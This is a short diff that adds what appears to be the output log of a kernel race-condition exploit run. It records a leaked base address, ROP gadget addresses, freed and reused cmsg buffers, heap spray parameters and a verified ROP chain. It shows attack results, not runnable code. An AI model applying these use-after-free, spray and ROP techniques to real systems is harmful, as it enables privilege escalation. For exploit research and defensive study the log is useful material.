@@ -1,0 +1,9 @@
+=== 1339m ASYMMETRIC RACE ===
+pid=353
+ebase=49E74000
+gadgets: pop_rax=49E74992 pop_rdi=49F3DDFE pop_rsi=49E8177D pop_rdx=4A2242D7 pop_rcx=49E74E64 fn=813788B57
+cmsg: bad=310F58000(24B) use=310F5C000(480B)
+stacks: free=311264000 use=311364000
+  chains verified OK
+params: TRIALS=500 SPRAY=128 FREE_OPTLEN=24 USE_OPTLEN=480
+trial 1: tc_after=0 tc_spray=0 (free_wins=1)
